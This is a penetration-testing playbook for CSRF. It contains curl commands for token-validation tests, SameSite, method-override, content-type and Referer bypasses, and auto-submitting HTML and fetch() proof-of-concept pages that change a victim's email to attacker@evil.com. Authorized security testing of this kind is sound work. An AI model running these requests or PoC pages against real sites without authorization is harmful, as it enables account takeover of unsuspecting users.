# Playbook: CSRF Testing

## Purpose
Detect and exploit Cross-Site Request Forgery on state-changing endpoints.
Covers token analysis, SameSite bypass, method override, and content-type tricks.
Input: authenticated session, endpoint list with state-changing actions.

---

## Step 1 — Identify State-Changing Endpoints

```bash
# From crawl/proxy history — filter for state-changing methods
# Look for: POST, PUT, DELETE, PATCH requests that modify data

# Key targets:
# - Password change
# - Email/profile update
# - Money transfer / payment
# - Admin actions (user create, role change)
# - Settings modification
# - Account deletion
# - API key generation/rotation
# - Webhook/integration setup

# Extract from Burp/proxy export
grep -iE "^(POST|PUT|DELETE|PATCH)" proxy_history.txt | sort -u > state_changing.txt
```

---

## Step 2 — Token Analysis

```bash
ENDPOINT="https://TARGET/account/settings"
COOKIE="session=AUTHENTICATED_COOKIE"

# Fetch the form and extract CSRF token
TOKEN=$(curl -sk -b "$COOKIE" "$ENDPOINT" \
  | grep -oiE "(csrf|token|_token|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken)\s*[=:]\s*[\"'][^\"']+[\"']" \
  | head -1)
echo "Token found: $TOKEN"

# Check token presence in:
# - Hidden form field
# - HTTP header (X-CSRF-Token, X-XSRF-Token)
# - Cookie (double-submit pattern)
# - URL parameter (weak)

# If NO token found → likely vulnerable
```

---

## Step 3 — Token Validation Tests

```bash
ENDPOINT="https://TARGET/api/change-email"
COOKIE="session=AUTHENTICATED_COOKIE"
VALID_TOKEN="abc123"

# Test 1 — Remove token entirely
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -d "email=attacker@evil.com"
# If action succeeds → VULNERABLE (no token check)

# Test 2 — Empty token
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -d "email=attacker@evil.com&csrf_token="

# Test 3 — Invalid/random token
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -d "email=attacker@evil.com&csrf_token=INVALID_RANDOM_STRING"

# Test 4 — Token from different session
# Login as user B, get their token, use with user A's session
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -d "email=attacker@evil.com&csrf_token=USER_B_TOKEN"

# Test 5 — Reuse old/expired token
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -d "email=attacker@evil.com&csrf_token=PREVIOUSLY_USED_TOKEN"

# Test 6 — Token in cookie only (double-submit without server validation)
curl -sk -b "$COOKIE; csrf=attacker_value" -X POST "$ENDPOINT" \
  -d "email=attacker@evil.com&csrf_token=attacker_value"
```

---

## Step 4 — SameSite Cookie Bypass

```bash
# Check SameSite attribute
curl -sk -D- "https://TARGET/login" | grep -i "set-cookie"
# SameSite=Strict → CSRF very hard (but check below)
# SameSite=Lax → POST-based CSRF blocked, but GET-based may work
# SameSite=None → CSRF possible (if Secure flag present)
# No SameSite → browser default (Lax in modern browsers)

# Lax bypass — method override
# If target accepts GET for state changes:
curl -sk -b "$COOKIE" "https://TARGET/api/change-email?email=attacker@evil.com"

# Lax bypass — top-level navigation
# <a href="https://TARGET/api/delete-account">Click here</a>

# Lax bypass — window.open (2-minute window after cookie set)
# <script>window.open("https://TARGET/api/action")</script>

# Method override headers
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "X-HTTP-Method-Override: GET" \
  -d "email=attacker@evil.com"

curl -sk -b "$COOKIE" -X POST "${ENDPOINT}?_method=GET" \
  -d "email=attacker@evil.com"
```

---

## Step 5 — Content-Type Bypass

```bash
# If endpoint expects JSON but checks Content-Type:

# Plain form submission (no preflight)
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"email":"attacker@evil.com"}'

# Text/plain (no preflight)
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com"}'

# Multipart (no preflight)
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "Content-Type: multipart/form-data; boundary=x" \
  -d $'--x\r\nContent-Disposition: form-data; name="json"\r\n\r\n{"email":"attacker@evil.com"}\r\n--x--'

# Fetch API with no-cors mode (limited but possible)
```

---

## Step 6 — Referer/Origin Bypass

```bash
# If CSRF protection relies on Referer or Origin header:

# Test 1 — No Referer
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "Referer: " \
  -d "email=attacker@evil.com"

# Test 2 — Referer with target in path
# Referer: https://attacker.com/https://TARGET/
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "Referer: https://attacker.com/https://TARGET/" \
  -d "email=attacker@evil.com"

# Test 3 — Referer with target as subdomain
curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -H "Referer: https://TARGET.attacker.com/" \
  -d "email=attacker@evil.com"

# Suppress Referer in HTML PoC:
# <meta name="referrer" content="no-referrer">
```

---

## Step 7 — PoC HTML

```html
<!-- Auto-submit CSRF PoC -->
<html>
<body>
<h2>CSRF PoC</h2>
<form id="csrf" action="https://TARGET/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>

<!-- JSON body CSRF via fetch -->
<html>
<body>
<script>
fetch("https://TARGET/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({"email": "attacker@evil.com"})
});
</script>
</body>
</html>
```

---

## Output

```
ENDPOINT      : POST /api/change-email
TOKEN CHECK   : No CSRF token required
SAMESITE      : Not set (browser defaults to Lax)
METHOD        : POST (blocked by Lax) → GET accepted (Lax bypass)
SEVERITY      : HIGH
IMPACT        : Account takeover via email change without user interaction
EVIDENCE      : [PoC HTML + successful email change screenshot]
```

---

## Tools Reference

```bash
# Burp Suite extensions:
# - CSRF Scanner
# - CSurfer
# - Generate CSRF PoC (right-click → Engagement tools)

# Manual testing preferred for CSRF — automated tools miss logic flaws
```
